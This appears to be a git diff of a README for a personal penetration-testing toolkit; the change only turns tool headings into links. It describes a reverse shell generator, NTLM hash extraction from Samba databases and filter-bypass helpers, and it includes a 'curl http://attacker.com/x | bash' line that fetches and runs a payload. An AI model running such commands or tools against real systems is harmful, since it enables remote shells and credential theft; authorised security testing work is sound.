@@ -1,10 +1,10 @@
 # Tools
 
-## adminer.sh -Secure Neo4j Password Wrapper for AD-miner
+## [adminer.sh](./adminer.sh) - Secure Neo4j Password Wrapper for AD-miner
 
 `adminer.sh` is a stupid wrapper. This script prompts for the password in a hidden input, runs AD-miner with the specified domain.
 
-## arpa.sh Quick Network Overview and Open Ports Scan
+## [arpa.sh](./arpa.sh) - Quick Network Overview and Open Ports Scan
 
 This script is can quickly gather a list of connected devices on a host, mostly intesting because of Docker containers, and perform a fast scan for common open ports. The main goal is to curl this script into bash for an immediate overview of active hosts and their services.
 
@@ -20,7 +20,7 @@ The script leverages tools like `ip`, `arp`, `nc`, and `awk` to identify availab
 ```bash
 curl -sSL <script_url> | bash
 ```
-## aws_enum.sh - Quick Overview of AWS Resources
+## [aws_enum.sh](./aws_enum.sh) - Quick Overview of AWS Resources
 
 This script automates the process of fetching details about AWS resources using a specified AWS profile. It logs the output to a file and retrieves key information like EC2 instances, S3 buckets, VPCs, IAM users, and more. It’s useful for getting a quick overview of the AWS environment, especially during audits or troubleshooting.
 
@@ -43,7 +43,7 @@ aws_enum.sh <aws-profile>
 
 
 
-## CertipyPermParse.py - Parse Certipy JSON Output for ACL Anomalies
+## [CertipyPermParse.py](./CertipyPermParse.py) - Parse Certipy JSON Output for ACL Anomalies
 
 This tool parses Certipy JSON output to identify anomalies in Access Control Lists (ACLs), helping you hunt for potential targets in a Windows Active Directory environment. By analyzing certificate templates, permissions, and vulnerabilities, the tool filters out standard groups and highlights unusual access permissions that could indicate misconfigurations or attack vectors.
 
@@ -69,7 +69,7 @@ python3 certipy_parser.py <file_path> [--csv <output_file>] [--exclude <principa
 python3 certipy_parser.py certipy_output.json --csv results.csv --exclude "Test User" --active-only
 ```
 
-## dns-dump.py - Resolve Domains and Dump DNS Records
+## [dns-dump.py](./dns-dump.py) - Resolve Domains and Dump DNS Records
 
 `dns-dump.py` is a Python script that resolves domain names to their corresponding IP addresses and, optionally, dumps all DNS records for each domain. The script supports saving the results in JSON format for easy review and analysis.
 
@@ -78,11 +78,11 @@ python3 certipy_parser.py certipy_output.json --csv results.csv --exclude "Test 
 python3 dns-dump.py <file> [--json] [--dump]
 ```
 
-## dns-query.py
+## [dns-query.py](./dns-query.py)
 
 Its dif ok?
 
-## hosts.py - Manage /etc/hosts File Quickly and Efficiently
+## [hosts.py](./hosts.py) - Manage /etc/hosts File Quickly and Efficiently
 
 `hosts.py` is one of my most used tools for quickly interacting with the `/etc/hosts` file. It allows for fast management of host entries, such as adding new IP-to-domain mappings, replacing existing entries (box reset), deleting entries, and listing current hosts. This script is especially helpful when you need to add virtual hosts (vhosts) and provides an efficient way to manage multiple entries without manually editing the file.
 
@@ -100,7 +100,7 @@ Its dif ok?
 ./hosts.py rm                # Delete an entry or specific domain
 ```
 
-## image-converter.py - Convert Images to Different File Types for File Upload Testing
+## [image-converter.py](./image-converter.py) - Convert Images to Different File Types for File Upload Testing
 
 `image-converter.py` is a small script that quickly converts an image into various file formats, making it ideal for testing file upload vulnerabilities. The script helps to generate multiple versions of an image to test for bypass file upload restrictions or filters.
 
@@ -109,7 +109,7 @@ Its dif ok?
 python3 image-converter.py <image_file> <output_directory>
 ```
 
-## ipconv.py - Convert IP Addresses to Various Formats to Bypass Restrictions
+## [ipconv.py](./ipconv.py) - Convert IP Addresses to Various Formats to Bypass Restrictions
 
 `ipconv.py` is a Python script that converts IPv4 addresses into different formats such as decimal, octal, and hexadecimal. These alternate representations of IP addresses can be useful for bypassing certain security restrictions or filters that may not recognize IPs in non-standard formats.
 
@@ -118,7 +118,7 @@ python3 image-converter.py <image_file> <output_directory>
 python3 ipconv.py <ip_address>
 ```
 
-## namegen.py - Generate Variants of Usernames for Enumeration
+## [namegen.py](./namegen.py) - Generate Variants of Usernames for Enumeration
 
 This tool generates various username variants based on a list of input names. It is especially useful for creating permutations of usernames that can be used during penetration testing. The tool supports generating combinations for both single-word and multi-word names, producing multiple formats such as hyphenated, underscored, and concatenated usernames.
 
@@ -156,7 +156,7 @@ Foo.B
 FB
 ```
 
-## ntlm-hasher.py - Calculate the NTLM Hash of a Password
+## [ntlm-hasher.py](./ntlm-hasher.py) - Calculate the NTLM Hash of a Password
 
 `ntlm-hasher.py` is a simple Python script used to compute the NTLM hash of a given password.
 
@@ -165,7 +165,7 @@ FB
 python3 ntlm-hasher.py <password>
 ```
 
-## ratelimit_check.py - Check for Rate Limiting on API Endpoints
+## [ratelimit_check.py](./ratelimit_check.py) - Check for Rate Limiting on API Endpoints
 
 `ratelimit_check.py` is a tool used to test for rate limiting on URL endpoints, specifically targeting API endpoints. The script sends a specified number of POST requests to a given URL and tracks the responses, allowing you to detect any signs of rate limiting or throttling by monitoring the returned HTTP status codes.
 
@@ -182,7 +182,7 @@ python3 ratelimit_check.py <url> <data> [--content-type json|form] [--num-reques
 ```
 
 
-## resh.py - Reliant Reverse Shell Generator
+## [resh.py](./resh.py) - Reliant Reverse Shell Generator
 
 `resh.py` is a Python script that generates a reverse shell script in multiple languages (Python, Perl, Netcat, PHP, Ruby, Lua, etc.) based on the target machine’s available interpreters. The generated reverse shell script can be easily executed by curling the output into bash, making it convenient for quick reverse shell setups during penetration testing.
 
@@ -207,7 +207,7 @@ curl -sSL http://attacker.com/x | bash
 ```
 
 
-## sammy.py - Extract NTLM Hashes from Samba's sam.ldb Database
+## [sammy.py](./sammy.py) - Extract NTLM Hashes from Samba's sam.ldb Database
 
 `sammy.py` is a tool to extract NTLM hashes from Samba's `sam.ldb` database. It connects to the database, searches for user objects with `unicodePwd` attributes, and converts these to NTLM-like hashes that can be used for further analysis or cracking.
 
@@ -221,7 +221,7 @@ curl -sSL http://attacker.com/x | bash
 python3 sammy.py <ldb_file>
 ```
 
-## subb.py - Quick V-Host Enumeration and Subdomain Discovery
+## [subb.py](./subb.py) - Quick V-Host Enumeration and Subdomain Discovery
 
 `subb.py` can quickly find virtual hosts (vhosts) for a given domain by either using a provided wordlist or generating a custom list of keywords using CeWL.
 
@@ -248,7 +248,7 @@ python3 sammy.py <ldb_file>
 
 
 
-## url-enum.sh - Enumerate and Extract URLs from Domains
+## [url-enum.sh](./url-enum.sh) - Enumerate and Extract URLs from Domains
 
 `url-enum.sh` is a Bash script that enumerates URLs from a list of domains using various tools such as `httpx`, `gospider`, `paramspider`, `gau`, `hakrawler`, and `galer`. It collects URLs from multiple sources, cleans them, and outputs the results into a file for further processing. The extracted URLs can then be used with other scripts, such as `url-parse-js.sh` for additional analysis.
 
@@ -268,7 +268,7 @@ python3 sammy.py <ldb_file>
 ```
 
 
-## url-parse-js.sh - Extract and Process JavaScript URLs from Domains
+## [url-parse-js.sh](./url-parse-js.sh) - Extract and Process JavaScript URLs from Domains
 
 `url-parse-js.sh` is a Bash script that extracts and processes JavaScript URLs from a list of domains and URLs. The script parses URLs, identifies JavaScript files, and can optionally use a provided cookie for session authentication. It processes the URLs, downloads the source code, and filters out unnecessary responses, such as HTTP 404 and 304 codes.
 
